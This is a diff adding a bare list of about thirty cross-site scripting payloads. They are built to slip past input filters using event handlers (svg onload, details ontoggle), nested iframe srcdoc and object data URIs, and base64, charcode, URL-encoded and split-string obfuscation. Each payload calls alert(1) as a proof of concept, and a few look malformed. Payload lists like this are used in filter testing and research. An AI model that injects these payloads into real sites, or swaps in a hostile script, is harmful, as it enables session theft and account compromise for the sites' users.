@@ -1,0 +1,32 @@
+```html
+<svg onload=window['\\u0061lert'](1)>
+<iframe srcdoc="<img src=x onerror=window['\\u0061lert'](1)>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></iframe>
+<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116))(1)>
+<marquee onstart=window[atob('YWxlcnQ=')](1)></marquee>
+<iframe srcdoc="<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='),0)>"></iframe>
+<details open ontoggle=window['al'+'ert'](1)></details>
+<svg onload=eval('String.fromCharCode(97,108,101,114,116,40,49,41)')>
+<iframe srcdoc='<svg onload=eval(atob("YWxlcnQoMSk="))></svg>'></iframe>
+<svg onload=setTimeout('al'+'ert(1)',0)>
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>"></iframe>
+<object data='data:text/html,<svg onload=window["al"+"ert"](1)>'></object>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></svg>
+<iframe srcdoc='<svg onload=window["\\u0061lert"](1)>'></iframe>
+<svg onload=eval('al'+'ert(1)')></svg>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:al'+'ert(1)'>"></iframe>
+<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74%28%31%29'),0)>
+<object data='data:text/html,<svg onload=eval("al"+"ert(1)")>'></object>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116)+String.fromCharCode(40,49,41))>
+<iframe srcdoc="<svg onload=eval('String.fromCharCode(97,108,101,114,116,40,49,41)')>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))></svg>
+<iframe srcdoc="<object data='data:text/html,<svg onload=window[\u0061lert](1)>'></object>"></iframe>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>
+<details open ontoggle=eval(atob('YWxlcnQoMSk='))></details>
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>
+<svg onload=window[atob('YWxlcnQ=')](1)>
+<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9d2luZG93WyJhbGVydCJdKDEpPg=='></object>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+```
